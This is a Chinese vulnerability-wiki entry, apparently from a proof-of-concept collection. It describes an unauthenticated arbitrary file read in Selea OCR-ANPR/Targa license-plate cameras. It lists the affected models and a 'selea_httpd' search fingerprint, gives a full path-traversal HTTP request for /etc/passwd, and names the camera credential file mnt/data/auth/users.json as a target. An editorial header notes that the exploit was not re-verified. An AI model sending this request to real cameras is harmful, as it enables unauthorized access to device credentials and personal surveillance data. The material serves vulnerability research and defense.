---
version: "Selea Selea Targa IP OCR-ANPR Camera iZero"
source: "Threekiii/Awesome-POC"
id: "vw-2b5546def2d242318640fc64"
entity_id: "ve-2b5546def2d242318640fc64"
schema_version: "1"
title: "Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞"
product: "Selea OCR-ANPR/Targa系列摄像机"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
identifier_status: "unknown"
identifier_role: "unknown"
primary_identifiers: ""
referenced_identifiers: ""
prerequisites: "无Cookie请求；9型号无固件边界"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/IOT%E5%AE%89%E5%85%A8/Selea/Selea%20OCR-ANPR%E6%91%84%E5%83%8F%E6%9C%BA%20SeleaCamera%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E.md"
review_date: "2026-10-02"
side_effects: "读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露"
source_status: "unknown"
canonical: "IOT安全/Selea/Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞.md"
---

# Selea OCR-ANPR摄像机 SeleaCamera 任意文件读取漏洞

<!-- article-review:devices:begin -->
## 技术校订与证据边界（2026-10-02）

- 产品/组件：Selea OCR-ANPR/Targa系列摄像机
- 本文讨论：CFCARD/images/SeleaCamera路径穿越读取
- 版本、权限与配置前提：无Cookie请求；9型号无固件边界
- 资料类型：目录穿越PoC；本次仅核对归档正文，未执行 PoC、未请求目标，未把原作者的“复现成功”继承为本库验证结果

### 逐项校订

- 型号重复Selea，版本字段实为型号列表首项
- 账号文件mnt/data/auth/users.json缺绝对路径斜杠说明，凭据内容/格式只图片
- 缺修复/原始公告
- 已落实的文本修订：HTTP 报文围栏改为 http。上列仍描述旧文问题时，以此落实项及下列限定为准；修订不代表运行验证

### 操作风险与恢复

- 读取内容可能包含配置、账户或个人数据；应只保存授权环境中最小必要且已脱敏的响应，不能由接口可达推定敏感内容已泄露

### 待核与来源

- 9型号受影响固件、匿名读取范围待核
- 引用图片未查看，截图内容及有效性待核验
- 文内原始链接和图片引用继续保留；未检查图片像素、未下载或执行外部附件。版本边界、修复/在野状态及厂商归属若缺一手依据，均不能视为本次已确认
- 下方保留原技术正文与载荷；其中历史时间表述和成功主张应按本节限定阅读
<!-- article-review:devices:end -->


## 漏洞描述

Selea OCR-ANPR摄像机 SeleaCamera 存在任意文件读取漏洞，攻击者通过构造特定的Url读取服务器的文件

## 漏洞影响

```
Selea Selea Targa IP OCR-ANPR Camera iZero
Selea Selea Targa IP OCR-ANPR Camera Targa 512
Selea Selea Targa IP OCR-ANPR Camera Targa 504
Selea Selea Targa IP OCR-ANPR Camera Targa Semplice
Selea Selea Targa IP OCR-ANPR Camera Targa 704 TKM
Selea Selea Targa IP OCR-ANPR Camera Targa 805
Selea Selea Targa IP OCR-ANPR Camera Targa 710 INOX
Selea Selea Targa IP OCR-ANPR Camera Targa 750
Selea Selea Targa IP OCR-ANPR Camera Targa 704 ILB
```

## 网络测绘

```
"selea_httpd"
```

## 漏洞复现

登录页面如下

![](./.resource/SeleaOCR-ANPR摄像机SeleaCamera任意文件读取漏洞/media/202202140932431.png)

发送如下请求包读取文件

```http
GET /CFCARD/images/SeleaCamera/%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc/passwd HTTP/1.1
Host: 
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Connection: close
```

![](./.resource/SeleaOCR-ANPR摄像机SeleaCamera任意文件读取漏洞/media/202202140932589.png)

摄像头账号密码文件为 **mnt/data/auth/users.json**

![](./.resource/SeleaOCR-ANPR摄像机SeleaCamera任意文件读取漏洞/media/202202140932748.png)


---

> 来源：Threekiii/Awesome-POC
